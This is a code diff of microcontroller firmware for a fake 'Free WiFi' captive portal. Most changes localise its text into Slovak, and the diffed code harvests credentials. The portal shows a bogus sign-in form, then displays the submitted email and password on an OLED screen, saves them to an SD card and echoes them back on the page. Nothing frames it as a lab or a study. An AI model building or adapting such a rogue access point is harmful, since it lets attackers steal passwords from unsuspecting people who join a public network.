@@ -37,10 +37,10 @@ Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
 // User configuration
 #define SSID_NAME "Free WiFi"
 #define SUBTITLE "Free WiFi service."
-#define TITLE "Sign in:"
+#define TITLE "Prihlásenie:"
 #define BODY "Create an account to get connected to the internet."
-#define POST_TITLE "Validating..."
-#define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
+#define POST_TITLE "Overuje sa ..."
+#define POST_BODY "Váše pruhlásenie je v procese. Prosím, počkajte 1 minutu pre pripojenie .</br>Ďakujeme za trpezlivosť."
 #define PASS_TITLE "Credentials"
 #define CLEAR_TITLE "Cleared"
 
@@ -64,13 +64,13 @@ void displayCredentials(String email, String password) {
   display.setTextColor(SSD1306_WHITE); 
   
   display.setCursor(0, 0);     
-  display.println("New Credentials:");
+  display.println("     Nove Udaje");
   display.println("Email:");
   display.println(email);      
-  display.println("Password:");
+  display.println("heslo:");
   display.println(password);   
   
-  display.display();           
+  display.display();
 }
 
 // Funkcia na uloženie údajov na SD kartu
@@ -78,16 +78,16 @@ void saveCredentialsToSD(String email, String password) {
   File dataFile = SD.open("/htmldata.txt", FILE_WRITE);  // Otvoríme súbor na zápis
 
   if (dataFile) {
-    dataFile.println("New Credentials:");
+    dataFile.println("Nove Udaje");
     dataFile.print("Email: ");
     dataFile.println(email);     // Uložíme email
-    dataFile.print("Password: ");
+    dataFile.print("heslo: ");
     dataFile.println(password);  // Uložíme heslo
     dataFile.println("--------------------");
     dataFile.close();  // Zatvoríme súbor
-    Serial.println("Data saved to SD card.");
+    Serial.println("Data ulozene do SD card.");
   } else {
-    Serial.println("Error opening file for writing.");
+    Serial.println("Chyba pri otvarani suboru.");
   }
 }
 
@@ -128,7 +128,7 @@ String posted() {
   // Ulož email a heslo na SD kartu
   saveCredentialsToSD(email, password);
 
-  return header(POST_TITLE) + POST_BODY + "</div><div><p>Email: <b>" + email + "</b></p><p>Password: <b>" + password + "</b></p></div>";
+  return header(POST_TITLE) + POST_BODY + "</div><div><p>Email: <b>" + email + "</b></p><p>heslo: <b>" + password + "</b></p></div>";
 }
 
 void setup() {
@@ -145,10 +145,10 @@ void setup() {
   
   // Inicializácia SD karty
   if (!SD.begin(SD_CS_PIN)) {
-    Serial.println("Error initializing SD card.");
+    Serial.println("Chyba pri otvarani SD karty !");
     return;
   }
-  Serial.println("SD card initialized.");
+  Serial.println("SD card inicializovana.");
 
   // Nastavenie Wi-Fi v režime Access Point (AP)
   WiFi.mode(WIFI_AP);
@@ -162,7 +162,7 @@ void setup() {
   });
   
   webServer.onNotFound([]() {
-    webServer.send(HTTP_CODE, "text/html", header(TITLE) + "<form action='/post' method='post'><b>Email:</b> <input type='text' name='email'><br><b>Password:</b> <input type='password' name='password'><br><input type='submit' value='Sign in'></form>");
+    webServer.send(HTTP_CODE, "text/html", header(TITLE) + "<form action='/post' method='post'><b>Email:</b> <input type='email' name='email'><br><b>Password:</b> <input type='password' name='password'><br><input type='submit' value='Sign in'></form>");
   });
   
   webServer.begin();
